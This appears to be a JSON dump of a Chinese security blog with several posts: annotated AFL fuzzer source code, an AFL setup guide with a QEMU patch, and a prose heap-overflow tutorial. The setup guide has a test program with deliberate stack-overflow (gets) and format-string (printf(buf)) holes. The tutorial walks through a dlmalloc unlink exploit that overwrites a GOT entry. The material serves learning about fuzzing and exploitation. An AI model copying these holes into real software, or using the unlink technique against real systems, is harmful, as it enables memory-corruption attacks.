srandom(rand_seed); /* 生成实际要执行的as的参数，作用类似afl-gcc.c中的edit_params */ edit_params(argc, argv); /* 1.检测inst_ratio_str的值是否在规定范围内 2.设置环境变量AS_LOOP_ENV_VAR的值 */ if (inst_ratio_str) { if (sscanf(inst_ratio_str, \"%u\", &inst_ratio) != 1 || inst_ratio > 100) FATAL(\"Bad value of AFL_INST_RATIO (must be between 0 and 100)\"); } if (getenv(AS_LOOP_ENV_VAR)) FATAL(\"Endless loop when calling 'as' (remove '.' from your PATH)\"); setenv(AS_LOOP_ENV_VAR, \"1\", 1); /* 在使用ASAN或MSAN的情况下(即AFL_USE_ASAN/AFL_USE_MASN中有一个值为1)： 1.设置sanitizer的值为1(表明使用了ASAN或MSAN) 2.令inst_ratio除以3，即降低插桩的概率(这是因为AFL无法在插桩的时候识别出 ASAN specific branches，所以会插入很多无意义的桩，为了降低这种概率，粗 暴的将整个插桩的概率都除以3) */ if (getenv(\"AFL_USE_ASAN\") || getenv(\"AFL_USE_MSAN\")) { sanitizer = 1; inst_ratio /= 3; } /* 如果just_version(只显示版本)的值为0 那么调用add_instrumentation进行实际的插桩工作 */ if (!just_version) add_instrumentation(); /* fork出一个子进程去执行调用实际的汇编器as完成汇编操作 fork函数被调用一次，但返回两次： 子进程的返回值是0 父进程的返回值是子进程的Pid */ if (!(pid = fork())) { execvp(as_params[0], (char**)as_params); FATAL(\"Oops, failed to execute '%s' - check your PATH\", as_params[0]); } if (pid < 0) PFATAL(\"fork() failed\"); /* 等待子进程结束 */ if (waitpid(pid, &status, 0)","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"Fuzzing","slug":"Fuzzing","permalink":"http://cata1oc.github.io/tags/Fuzzing/"}]},{"title":"AFL源码分析01：afl-gcc.c","slug":"AFL源码分析01","date":"2022-01-02T14:07:31.000Z","updated":"2022-05-17T15:54:49.332Z","comments":true,"path":"2022/01/02/AFL源码分析01/","link":"","permalink":"http://cata1oc.github.io/2022/01/02/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%9001/","excerpt":"","text":"前言阅读AFL源码是深入理解Fuzz的第一步，也是为日后对AFL进行魔改或打造自己的Fuzz工具打下基础，本篇从插桩编译开始，一步步了解AFL进行Fuzz的完整流程。 afl-gcc.c源码分析概述 AFL（普通）插桩部分源码主要有3个：afl-gcc.c、afl-as.h、afl-as.c 本质上afl-gcc是对gcc/clang的一个封装（wrapper），通过对程序的不同分支进行插桩，从而记录程序的执行路径，检测样本的覆盖率等程序运行情况的反馈信息 为了阅读方便，本篇及之后的分析均保留源码本身，并将分析以注释的方式标记在源码附近，同时根据情况修剪源码中原本的注释 关键变量c12345static u8* as_path; /* 指向afl-as的路径(一个AFL对as的wrapper) */static u8** cc_params; /* 一个数组，用于存放实际传递给编译器CC的参数 */static u32 cc_par_cnt = 1; /* 用于计算在数组cc_params中参数个数 */static u8 be_quiet, /* 静默模式 */ clang_mode; /* afl-clang模式 */ mainc12345678910111213141516171819202122232425262728293031/* 主程序入口点 */int main(int argc, char** argv) { if (isatty(2) && !getenv(\"AFL_QUIET\")) { SAYF(cCYA \"afl-cc \" cBRI VERSION cRST \" by \\n\"); } else be_quiet = 1; if (argc < 2) { SAYF(\"\\n\" \"This is a helper application for afl-fuzz. It serves as a drop-in replacement\\n\" \"for gcc or clang, letting you recompile third-party code with the required\\n\" \"runtime instrumentation. A common use pattern would be one of the following:\\n\\n\" \" CC=%s/afl-gcc ./configure\\n\" \" CXX=%s/afl-g++ ./configure\\n\\n\" \"You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\\n\" \"Setting AFL_HARDEN enables hardening optimizations in the compiled code.\\n\\n\", BIN_PATH, BIN_PATH); exit(1); } find_as(argv[0]); edit_params(argc, argv); execvp(cc_params[0], (char**)cc_params); FATAL(\"Oops, failed to execute '%s' - check your PATH\", cc_params[0]); return 0;} 删去主函数中不值得关注的部分，我们可以做一个简化，如下所示： c1234567int main(int argc, char** argv) { find_as(argv[0]); /* 找到afl-as，将其加入路径 */ edit_params(argc, argv); /* 设置gcc所需的参数 */ execvp(cc_params[0], (char**)cc_params); /* 调用实际的gcc进行编译 */ return 0;} find_asc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/* 查找AFL自己的汇编器afl-as的路径，并将其设置为as_path */static void find_as(u8* argv0) { /* 获取环境变量AFL_PATH的值 */ u8 *afl_path = getenv(\"AFL_PATH\"); u8 *slash, *tmp; /* 如果afl_path指向的路径不为空 判断afl_path/as是否存在 如果存在就将as_path的值设置为afl_path */ if (afl_path) { tmp = alloc_printf(\"%s/as\", afl_path); if (!access(tmp, X_OK)) { as_path = afl_path; ck_free(tmp); return; } ck_free(tmp); } /* 获取到argv0中最后一个出现'/'的地方 */ slash = strrchr(argv0, '/'); if (slash) { u8 *dir; /* 截断最后一个'/'后面的字符串 dir获取到最后一个'/'出现之前的字符串 将tmp设置为dir/afl-as */ *slash = 0; dir = ck_strdup(argv0); *slash = '/'; tmp = alloc_printf(\"%s/afl-as\", dir); /* 若该路径存在，则设置as_path的值为dir */ if (!access(tmp, X_OK)) { as_path = dir; ck_free(tmp); return; } ck_free(tmp); ck_free(dir); } /* 如果上述两种方案都没找到，就直接拼接AFL_PATH和/as去找(感觉和第一种方式是一样的) 如果还是没找到，就通过FATAL输出错误信息后exit(1)退出 */ if (!access(AFL_PATH \"/as\", X_OK)) { as_path = AFL_PATH; return; } FATAL(\"Unable to find AFL wrapper binary for 'as'. Please set AFL_PATH\"); } edit_paramsc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232/* 将参数argv传递给参数数组cc_params, 并根据编译需求做一些必要的修改 */static void edit_params(u32 argc, char** argv) { u8 fortify_set = 0, asan_set = 0; u8 *name;#if defined(__FreeBSD__) && defined(__x86_64__) u8 m32_set = 0;#endif /* 给cc_params分配内存，大小为(argc+128)*8 */ cc_params = ck_alloc((argc + 128) * sizeof(u8*)); /* 找到argv[0]中最后一个出现'/'的地方, 若argv[0]中不存在'/'，则设置name为argv[0], 如果argv[0]中存在'/'，则设置name的值为'/'后面的字符串 */ name = strrchr(argv[0], '/'); if (!name) name = argv[0]; else name++; /* 如果name的前9个字符是afl-clang： 设置clang_mode值为1 设置环境变量CLANG_ENV_VAR的值为1 */ if (!strncmp(name, \"afl-clang\", 9)) { clang_mode = 1; setenv(CLANG_ENV_VAR, \"1\", 1); /* 如果name的值是afl-clang++ 获取环境变量AFL_CXX 如果AFL_CXX存在，则将其添加至cc_params数组的第一个元素 如果AFL_CXX不存在，则将clang++添加至cc_params数组的第一个元素 否则 获取环境变量AFL_CC 如果AFL_CC存在，则将其添加至cc_params数组的第一个元素 如果AFL_CC不存在，则将clang添加至cc_params数组的第一个元素 */ if (!strcmp(name, \"afl-clang++\")) { u8* alt_cxx = getenv(\"AFL_CXX\"); cc_params[0] = alt_cxx ? alt_cxx : (u8*)\"clang++\"; } else { u8* alt_cc = getenv(\"AFL_CC\"); cc_params[0] = alt_cc ? alt_cc : (u8*)\"clang\"; } } else { #ifdef __APPLE__ /* 若afl-gcc运行在Apple平台下，则会进入#ifdef __APPLE__ 进行如下操作 如果name的值是afl-g++，则将环境变量AFL_CXX的值其添加至cc_params数组的第一个元素 如果name的值是afl-gcj，则将环境变量AFL_GCJ其添加至cc_params数组的第一个元素 否则，将环境变量AFL_CC其添加至cc_params数组的第一个元素 */ if (!strcmp(name, \"afl-g++\")) cc_params[0] = getenv(\"AFL_CXX\"); else if (!strcmp(name, \"afl-gcj\")) cc_params[0] = getenv(\"AFL_GCJ\"); else cc_params[0] = getenv(\"AFL_CC\"); if (!cc_params[0]) { SAYF(\"\\n\" cLRD \"[-] \" cRST \"On Apple systems, 'gcc' is usually just a wrapper for clang. Please use the\\n\" \" 'afl-clang' utility instead of 'afl-gcc'. If you really have GCC installed,\\n\" \" set AFL_CC or AFL_CXX to specify the correct path to that compiler.\\n\"); FATAL(\"AFL_CC or AFL_CXX required on MacOS X\"); }#else /* 如果是Apple、x86_64、FreeBSD以外的系统架构 则会通过下面的指令去设置cc_param数组的第一个元素 */ if (!strcmp(name, \"afl-g++\")) { u8* alt_cxx = getenv(\"AFL_CXX\"); cc_params[0] = alt_cxx ? alt_cxx : (u8*)\"g++\"; } else if (!strcmp(name, \"afl-gcj\")) { u8* alt_cc = getenv(\"AFL_GCJ\"); cc_params[0] = alt_cc ? alt_cc : (u8*)\"gcj\"; } else { u8* alt_cc = getenv(\"AFL_CC\"); cc_params[0] = alt_cc ? alt_cc : (u8*)\"gcc\"; }#endif /* __APPLE__ */ } while (--argc) { /* 从第二个参数开始遍历argv中的参数，进行过滤 */ u8* cur = *(++argv); /* 跳过参数'-B'：'-B'选项用于设置编译器的搜索路径，这里跳过 因为之前已经处理过as_path了 */ if (!strncmp(cur, \"-B\", 2)) { if (!be_quiet) WARNF(\"-B is already set, overriding\"); if (!cur[2] && argc > 1) { argc--; argv++; } continue; } /* 跳过参数'-integrated-as' 跳过参数'-pipe' */ if (!strcmp(cur, \"-integrated-as\")) continue; if (!strcmp(cur, \"-pipe\")) continue; #if defined(__FreeBSD__) && defined(__x86_64__) if (!strcmp(cur, \"-m32\")) m32_set = 1;#endif /* 如果参数为'-fsanitize=address'或者'-fsanitize=memory'(告诉gcc检查内存访问的错 误，比如数组越界之类) 则设置asan_set的值为1 如果参数的子串中包含'FORTIFY_SOURCE'(FORTIFY_SOURCE主要进行缓冲区溢出问题的检查， 通常会检查memcpy, mempcpy, memmove, memset, strcpy, stpcpy, strncpy, strcat, strncat, sprintf, vsprintf, snprintf, gets等函数) 则设置fortify_set的值为1 */ if (!strcmp(cur, \"-fsanitize=address\") || !strcmp(cur, \"-fsanitize=memory\")) asan_set = 1; if (strstr(cur, \"FORTIFY_SOURCE\")) fortify_set = 1; /* 没有被跳过的参数，将被依次加入cc_params数组中 */ cc_params[cc_par_cnt++] = cur; } /* 添加参数'-B' 添加汇编器as的路径作为参数 */ cc_params[cc_par_cnt++] = \"-B\"; cc_params[cc_par_cnt++] = as_path; /* 如果是clang_mode(即第一个参数是afl-clang/afl-clang++) 则添加参数'-no-integrated-as' */ if (clang_mode) cc_params[cc_par_cnt++] = \"-no-integrated-as\"; /* 如果设置了环境变量AFL_HARDEN 添加参数'-fstack-protector-all' 如果fortify_set的值没有被设置 则添加参数'-D_FORTIFY_SOURCE=2' */ if (getenv(\"AFL_HARDEN\")) { cc_params[cc_par_cnt++] = \"-fstack-protector-all\"; if (!fortify_set) cc_params[cc_par_cnt++] = \"-D_FORTIFY_SOURCE=2\"; } /* 如果asan_set被设置了(前面的参数为'-fsanitize=address'或者'-fsanitize=memory') 就设置环境变量AFL_USE_ASAN的值为1 否则 如果存在环境变量AFL_USE_ASAN 则添加参数'-U_FORTIFY_SOURCE'和'-fsanitize=address' 这里不能同时指定AFL_HARDEN或者AFL_USE_MSAN，会导致运行时速度过慢 如果存在环境变量AFL_USE_MSAN 则添加参数'-U_FORTIFY_SOURCE'和'-fsanitize=memory' 同上不能同时指定AFL_HARDEN或者AFL_USE_ASAN，会导致运行时速度过慢 */ if (asan_set) { /* 传递这个参数给afl-as用于调整映射密度 */ setenv(\"AFL_USE_ASAN\", \"1\", 1); } else if (getenv(\"AFL_USE_ASAN\")) { if (getenv(\"AFL_USE_MSAN\")) FATAL(\"ASAN and MSAN are mutually exclusive\"); if (getenv(\"AFL_HARDEN\")) FATAL(\"ASAN and AFL_HARDEN are mutually exclusive\"); cc_params[cc_par_cnt++] = \"-U_FORTIFY_SOURCE\"; cc_params[cc_par_cnt++] = \"-fsanitize=address\"; } else if (getenv(\"AFL_USE_MSAN\")) { if (getenv(\"AFL_USE_ASAN\")) FATAL(\"ASAN and MSAN are mutually exclusive\"); if (getenv(\"AFL_HARDEN\")) FATAL(\"MSAN and AFL_HARDEN are mutually exclusive\"); cc_params[cc_par_cnt++] = \"-U_FORTIFY_SOURCE\"; cc_params[cc_par_cnt++] = \"-fsanitize=memory\"; } if (!getenv(\"AFL_DONT_OPTIMIZE\")) {#if defined(__FreeBSD__) && defined(__x86_64__) /* 在64位FreeBSD系统上，clang -g -m32已损坏，但'-m32'本身工作正常 这与我们无关，但尽量避免触发这个错误 */ if (!clang_mode || !m32_set) cc_params[cc_par_cnt++] = \"-g\";#else cc_params[cc_par_cnt++] = \"-g\";#endif /* 如果不存在环境变量AFL_DONT_OPTIMIZE 则依次添加下列参数： '-O3' '-funroll-loops' '-D__AFL_COMPILER=1' '- DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1' 其中后面2个参数意味你正在构建模糊测试， 其中之一是AFL特有的，另一个是与libfuzzer共享的*/ cc_params[cc_par_cnt++] = \"-O3\"; cc_params[cc_par_cnt++] = \"-funroll-loops\"; cc_params[cc_par_cnt++] = \"-D__AFL_COMPILER=1\"; cc_params[cc_par_cnt++] = \"-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1\"; } /* 如果存在环境变量AFL_NO_BUILTIN，则表示允许进行优化 则依次添加下面这些参数...... */ if (getenv(\"AFL_NO_BUILTIN\")) { cc_params[cc_par_cnt++] = \"-fno-builtin-strcmp\"; cc_params[cc_par_cnt++] = \"-fno-builtin-strncmp\"; cc_params[cc_par_cnt++] = \"-fno-builtin-strcasecmp\"; cc_params[cc_par_cnt++] = \"-fno-builtin-strncasecmp\"; cc_params[cc_par_cnt++] = \"-fno-builtin-memcmp\"; cc_params[cc_par_cnt++] = \"-fno-builtin-strstr\"; cc_params[cc_par_cnt++] = \"-fno-builtin-strcasestr\"; } /* 最后截断cc_params，完成对cc_params参数数组的编辑 */ cc_params[cc_par_cnt] = NULL; } execvp执行编译命令，生成目标文件。这个函数看手册就行了 （普通）插桩流程 插桩的过程如上图所示，看上去就是在普通程序编译的过程中，将gcc替换成了afl-gcc。为了更好的理解这个过程，我们做如下操作： 打开afl-gcc.c，在edit_params之后添加如下代码，打印cc_params来查看实际执行的命令 c123for(int i = 0; i < sizeof(cc_params); i++) { printf(\"\\targ%d: %s\\n\", i, cc_params[i]);} 然后执行 shell12$ make$ sudo make install 查看打印的参数 可以看到，afl-gcc.c帮我们添加了3个参数-B, /usr/local/lib/afl, -g。这是因为在Linux机器上使用gcc进行编译的时候，默认会使用GNU as作为汇编器，因此这里使用”-B“参数指定使用afl-as。之后afl-as读取并分析输入的.s文件，然后添加instrumentation trampoline 和 main payload，之后再调用GNU as，本质上afl-as也是一个对GNU as的wrapper。 在下一篇，我们会继续分析与（普通）插桩相关的afl-as.c，去研究afl-as到底做了什么。 参考资料 hollk：AFL源码分析之afl-gcc.c详细注释 skr：sakuraのAFL源码全注释 Seebug：AFL 二三事——源码分析 AFL内部实现细节小记 AFL：afl-gcc.c ScUpax0s：AFL源码阅读笔记之gcc与fuzz部分 HICOOKIE：AFL-Learning 简书：AFL源码分析","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"Fuzzing","slug":"Fuzzing","permalink":"http://cata1oc.github.io/tags/Fuzzing/"}]},{"title":"AFL环境搭建","slug":"AFL环境搭建","date":"2021-12-22T14:07:31.000Z","updated":"2022-05-17T15:54:19.896Z","comments":true,"path":"2021/12/22/AFL环境搭建/","link":"","permalink":"http://cata1oc.github.io/2021/12/22/AFL%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"前言本篇博客以此文的内容为基础进行扩展延申，并记录了用Qemu模式Fuzz时的踩坑过程及解决方案。 AFL简介 概述：AFL（American Fuzzy Lop）是一款开源的Fuzzing测试工具，由Google安全工程师MIchal Zalewski开发 Fuzz模式： 有源码模式：通过对源码重新编译时进行插桩（instrumentation）的方式，自动产生测试用例来探索二进制程序内部新的执行路径 无源码模式：配合QEMU等工具，对闭源二进制代码进行fuzzing，但执行效率会受到影响 工作原理（有源码模式） 使用afl-clang/clang++ 或 afl-gcc/g++ 来编译工程代码 将testcase写入文件（文件大小尽量＜1K）作为输入 启动afl-fuzz，读取testcase(seed)，作为输入执行程序 如果发现新的路径则保存此testcase到一个queue中，afl-fuzz依据最初的testcase进行突变，以产生不同的样例输入 如果程序崩溃，则记录crash 特点 与其他基于插装技术的fuzzers相比，afl-fuzz具有较低的性能消耗，有各种高效的fuzzing策略和tricks最小化技巧，不需要先行复杂的配置，能无缝处理复杂的现实中的程序 安装在github下载压缩包，解压后在目录中打开终端输入： shell12makesudo make install 输入以上命令后基本就能安装成功了，在终端输入afl-后tab，就能出现以下这些命令了 说明安装成功 有源码Fuzz编写测试程序c123456789101112131415161718192021222324252627282930313233343536// 编写测试程序test.c，这里头文件都用\"\"，主要是防止博客识别markdown时将其清空。实际编写时请替换回#include \"stdio.h\"#include \"stdlib.h\" #include \"unistd.h\" #include \"string.h\" #include \"signal.h\" int vuln(char *str){ int len = strlen(str); if(str[0] == 'A' && len == 66) { // 如果输入的字符串的首字符为A并且长度为66，则异常退出 raise(SIGSEGV); } else if(str[0] == 'F' && len == 6) { // 如果输入的字符串的首字符为F并且长度为6，则异常退出 raise(SIGSEGV); } else { printf(\"it is good!\\n\"); } return 0;}int main(int argc, char *argv[]){ char buf[100]={0}; gets(buf); // 存在栈溢出漏洞 printf(buf); // 存在格式化字符串漏洞 vuln(buf); return 0;} 插桩编译 普通程序编译： 执行afl-gcc test.c -o afl_test对测试程序进行编译，如果是一个c++的源码，那就需要用afl-g++。afl-clang和afl-clang++的使用方法类似 建立两个文件夹：fuzz_in和fuzz_out，用来存放程序的输入和fuzz的输出结果 在fuzz in中需要创建一个testcase文件，AFL在fuzz时会从该文件中读取测试样例。在本例中，在testcase中写入abc就可以了 编译项目： 在编译项目时，通常有Makefile，这时就需要在Makefile中添加内容 gcc/g++重新编译目标程序的方法如下： C程序：设置CC=/path/to/afl/afl-gcc ./configure C++程序：设置CXX=/path/to/afl/afl-g++ . 执行make clean all afl-clang和afl-clang++的使用方法类似 开始Fuzz对那些可以直接从stdin读取输入的目标程序来说，语法如下： shell1$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…] 对从文件读取输入的目标程序来说，要用“@@”，语法如下： shell1$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@ 输入命令：afl-fuzz -i fuzz_in -o fuzz_out ./afl_test 表示，从fuzz_in中读取输入，输出放入fuzz_out中，afl_test是我们要进行fuzz的程序，-f参数表示：testcase的内容会作为afl_test的stdin 如果出现如下错误（我没遇到，直接执行成功了）： 需要根据提示设置core_pattern： 切换到root用户 echo core > /proc/sys/kernel/core_pattern 再次执行afl-fuzz -i fuzz_in -o fuzz_out ./afl_test AFL界面执行成功后，便会开始fuzz，出现下图所示界面： 界面上的数据含义都比较清晰，有不明白的地方可以直接参考官方文档 Crash分析由上图，经过一段时间的fuzz后，发现了6个crash，进入fuzz_out目录下查看情况，其中自动生成了一些文件夹，含义如下： crashes：产生crash的测试用例 hangs：产生超时的测试用例 queue：每个不同执行路径的测试用例 本次实验我们对crashes文件夹更感兴趣，分别查看导致不同crash的测试样例： 由上图可知，AFL成功检测出我们预先设置的导致crash的情况以及潜在的漏洞。 无源码Fuzz有源码的Fuzz测试主要针对开源软件进行，对于一些不开源的产品，AFL使用了QEMU模式进行测试，只需要在之前命令的基础上加上参数-Q即可。 准备工作执行如下指令，完成对QEMU的配置 shell1234$ cd qemu_mode$ ./build_qemu_support.sh$ cd ..$ make install 执行上述指令时，必定会报错，下面来看可能的错误类型与修复方案。 报错修复我在执行指令./build_qemu_support.sh时，就遇到报错了， 在看雪找到一个解决的方案是安装qemu 对于16.0.4之后版本的Ubuntu，Qemu的安装方式为apt-get install qemu-user。执行完该指令后，在终端输入qemu-后tab，就能出现以下这些命令了 但实际上仍未解决这个问题，在看雪的评论区找到另一个方案：通过打补丁来解决。上述报错中，其中一个问题是“static declaration of ‘gettid’ follows non-static declaration”。这里层主参考qemu的一个补丁，编写了afl的补丁。这里我们直接拿过来用就可以了。完整补丁如下所示： diff123456789101112131415161718192021222324252627282930313233343536373839404142--- qemu-2.10.0-rc3-clean/linux-user/syscall.c 2020-11-06 22:14:34.218924847 -0500+++ qemu-2.10.0-rc3/linux-user/syscall.c 2020-11-06 22:17:09.722926317 -0500@@ -258,7 +258,8 @@ #endif #ifdef __NR_gettid-_syscall0(int, gettid)+#define __NR_sys_gettid __NR_gettid+_syscall0(int, sys_gettid) #else /* This is a replacement for the host gettid() and must return a host errno. */@@ -6221,7 +6222,7 @@ cpu = ENV_GET_CPU(env); thread_cpu = cpu; ts = (TaskState *)cpu->opaque;- info->tid = gettid();+ info->tid = sys_gettid(); task_settid(ts); if (info->child_tidptr) put_user_u32(info->tid, info->child_tidptr);@@ -6365,9 +6366,9 @@ mapping. We can't repeat the spinlock hack used above because the child process gets its own copy of the lock. */ if (flags & CLONE_CHILD_SETTID)- put_user_u32(gettid(), child_tidptr);+ put_user_u32(sys_gettid(), child_tidptr); if (flags & CLONE_PARENT_SETTID)- put_user_u32(gettid(), parent_tidptr);+ put_user_u32(sys_gettid(), parent_tidptr); ts = (TaskState *)cpu->opaque; if (flags & CLONE_SETTLS) cpu_set_tls (env, newtls);@@ -11404,7 +11405,7 @@ break; #endif case TARGET_NR_gettid:- ret = get_errno(gettid());+ ret = get_errno(sys_gettid()); break; #ifdef TARGET_NR_readahead case TARGET_NR_readahead: 将上述补丁命名为gettid.diff，并保存在patches目录下。然后在build_qemu_support.sh中patch那一段的最后加上patch -p1","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"Fuzzing","slug":"Fuzzing","permalink":"http://cata1oc.github.io/tags/Fuzzing/"}]},{"title":"缓冲区溢出入门(下)","slug":"缓冲区溢出入门-下","date":"2021-11-13T10:01:01.000Z","updated":"2022-05-17T15:53:51.159Z","comments":true,"path":"2021/11/13/缓冲区溢出入门-下/","link":"","permalink":"http://cata1oc.github.io/2021/11/13/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8-%E4%B8%8B/","excerpt":"","text":"前言堆溢出相对前两种缓冲区溢出方式更为复杂一些，因此这里单独开一篇对堆溢出进行简单介绍。 堆的生命周期为了方便理解，这里先不讲堆的利用方式，而是先过一遍堆的分配与释放的流程。然后根据内存中堆的变化情况，在去查看源码去了解堆的结构，寻找堆的利用方式，再进行堆的利用。 首先，这里还是选择Protostar上的一道题进行分析，题目如下： 由题，程序首先将3个输入的参数复制到申请的堆上，然后再释放掉。下面来看程序的执行流程： 第一步，在每个函数调用结束后的地方下断，这样可以可以较为清晰的看到堆中内存的变化情况；然后运行一次程序，找到堆在内存中的位置，从而设置好hook工具，在程序断下时，能够自动查看堆部分的内存。操作如下图所示： 重新运行程序，分别在3次malloc调用后断下，观察堆中的内存分布，如下图所示。橙色表示第一块malloc出来的区域，蓝色表示第二块malloc出来的区域，紫色表示第三块malloc出来的区域。这些malloc出来的区域又称作chunk，0x29表示的正是chunk的大小，稍后会解释为什么在调用malloc时传入的参数是0x20，而这里chunk的大小又是0x29。红色方框内的数字，表示堆中剩余内存的大小。可以发现每调用一次malloc，堆中剩余的大小就会减少0x28。 接着执行3次strcpy，众所周知，这是一个不检查参数长度的函数，也是导致各类溢出的罪魁祸首之一。我们这次传入了长度大小适宜的参数作为演示，可以看到，参数值会被写入chunk大小后的位置。 最后是3次free，注意观察发生变化的位置： 先是free掉最后一个chunk，这里将chunk中的字符串的前四字节清零了 接着free掉第二个chunk，并让原先字符串的前四字节指向了第三个chunk的地址 最后free掉第一个chunk，做法同free掉第二个chunk时一样 这里就会产生疑问，为什么修改的是字符串的前4字节？为什么会指向下一个chunk，这些将在下一部分讲解 堆的利用方式首先需要说明的是，本题的利用方式并不通用。这道题的环境，使用dlmalloc（Linux早期的堆分配与回收的实现，由Doug Lea编写）作为堆分配器，而现如今Linux的发行版使用的是glibc中的堆分配器：ptmalloc2。 接下来看利用方式，首先观察题目本身，需要重定向到函数winner，所以考虑将printf的GOT修改为winner的地址。但显然，没有很直接的方式去修改，因此下面需要了解一些堆的相关概念和函数的实现细节，从而寻找突破口。这部分源码参考此处（注意源码的版本，有些版本已经修复此漏洞） 堆的结构前面提到malloc出来的区域其实是一个chunk，其结构如下： 下面以之前的运行结果为例，说明一下各个结构 橙色方框：整个chunk 绿色方框：前一个chunk的prev_size，不包括（prev_inuse） 蓝色方框：当前chunk的size，其中最后一个bit值的含义为prev_inuse。若前一个块正在被使用，则该bit置1。第一个chunk之前的区域为代码段，所以会被认为是正在使用的区域，因此该值设置为1，因此这里的值为0x29而不是0x28。 紫色方框：fd，指向前一个chunk 红色方框：bk，指向后一个chunk。这里的fd和bk的使用都是有前提的，而本题在free时，仅用了fd，并且指向的不是前一个chunk，而是后一个chunk，形成的是一个单链表。 free的执行流程这里为什么选择free呢？首先，strcpy是能够产生溢出的函数，但不是实现溢出利用的函数，因此想要实现堆溢出利用，需要往后找其它函数，通过之前的溢出练习，可以很自然的想到通过修改printf的GOT表实现重定向，而谁来帮我们做这件事呢？strcpy肯定不能，那么就只能把目光放在free上了。 用我找的这部分源码做图会比较麻烦，为了方便观看，就直接用视频里的截图了（虽然他这一期有些小错误，我后面会指出来），不过也建议自己阅读一遍这部分源码，很短，难度不大： dlmalloc的free的实现由_int_free完成，这里传入的参数mem，就是需要free掉的内存地址，也就是字符串的起始地址（chunk+8的位置）。开始会调用宏mem2check获取chunk的地址。 来到第一个if块，当chunk的size小于fastbin规定的最大size（80或0x50）时，就会执行下面的部分。这部分，也就是上面介绍堆的生命周期时，在执行free时看到的过程，会形成一个单链表。这部分显然不能构造出溢出，所以不关心。 来到else if这里，走到这里，也就是说要保证我们free掉的chunk大小必须大于80或0x50。这里还有一个判断条件，就是is_mmaped，由图，前面说到，chunk的size位于第二个字段，其中倒数第一个bit表示prev_inuse，而倒数第二个bit就表示is_mmaped（图中红框中也有显示），根据这里的条件，想要进入语句块，需要将is_mmaped位置0。 这里有一个很重要的点，就是unlink，当然了，视频里这里出错了，实际上不需要在这个unlink进行GOT的覆盖，后面还有一个unlink，但是，unlink是一个关键的函数 来看unlink的定义，FD表示前一个chunk的地址，BK表示后一个chunk的地址。unlink的操作就是将当前chunk从（fd和bk维护的）双链表断掉，将前一个chunk和后一个chunk链接起来，其目的是为了使当前chunk和前一个chunk合并成一个chunk。这就是当chunk的size大于fastbin规定的最大size时可能会做的操作（说可能是因为，这里走的是prev_inuse为0的操作，下面还有一个unlink也可以用于利用）。 这里需要特别注意的是，unlink操作时，会有一个将BK赋值给FD->bk的操作。换个思路，如果FD就是printf的GOT表，BK就是winner的地址，那么不就可以实现函数执行的重定向了？当然不会这么简单，因为紧接着，就会有一个FD赋值给BK->fd的操作，如果BK是winner的地址，那么在BK->fd处，也就是&winner+0x8的位置会被赋值，这样在执行winner时，就会出错了。不过这里可以换个思路，如果BK设置的不是winner的地址，而是一个位于堆上的跳转指令（通常小于8字节），这样在FD赋值到BK->fd时，就不会对winner函数本身造成影响了。有了这个思路，我们开始手动去去实现堆溢出的利用。 利用过程根据上述对堆free执行流程以及堆结构本身的了解，下面来尝试实现本题对于堆的利用： 首先将程序断在第一个free执行前的位置，目前堆中是我们熟悉的情况。接下来，结合前面讲到的方法，修改此时堆中的内存，利用free执行时的漏洞实现对printf的GOT表的修改，从而完成执行时的重定位。 回顾一下，前面提到的free的利用过程，这里一共有两个unlink。我们选择从第二个unlink入手。想要执行这个unlink则需要实现以下操作： chunksize > 80或0x50，这样才能走到执行到这里，不然free的执行流程就和前面讲堆生命周期时介绍的一样了 prev_inuse == 1，来保证不执行红色方框的unlink nextchunk != av->top，这意思就是下一个chunk不是最后一个chunk，由于这里我们要free的本身就是最后一个chunk了，因此，我们之后还要再构造2个chunk nextinuse == 0，这是判断下一个chunk是否在使用，这个值通过最后一个chunk的prev_inuse来判断（因为我们会多设置2个chunk） 根据第2步的要求，对堆进行如下设置。这里要free的块的大小选择了0x60，并设置了prev_inuse，从而不会去执行第一个unlink。绿色方框则是构造的2个chunk，大小都是0x10，其中第二个没有设置prev_inuse，从而可以执行第二个unlink。最后还构造了新的剩余堆的大小，以防崩溃。 下面是构造的很关键，由于我们选择的是第二个unlink，因此需要去构造free时的下一个chunk的fd和bk，这里橙色方框是将fd的值设置为printf的GOT表的地址减去0xC的位置，这里减去0xC是因为调用的时候bk位于chunk+0xC的偏移处；绿色方框则是设置了一个堆中的地址，指向了第一个chunk；蓝色方框非常关键，这其实是jmp 0x83e58955(winner的地址)的机器指令，共5个字节，这个跳转的是根据偏移进行跳转，偏移的计算过程不在此列出，可自行查阅。 构造完上述内容后，在执行free时，绿色方框所指向的堆的地址就会写入printf的GOT表中；而GOT表中偏移位为-0xC处的值（也就是橙色方框地址所指的值），也会写入图中灰色方框的位置，这样刚好不影响我们嵌入的跳转指令。最后，继续执行程序，发现可以成功执行winner函数中的内容，利用成功！ Shellcode编写有了上述的理论，就可以编写Shellcode了。这里不作演示，不过有以下注意点： strcpy遇到\\x00是会停止的，所以构造新的chunk时需要注意。可以利用32位机器上0xfffffffc == 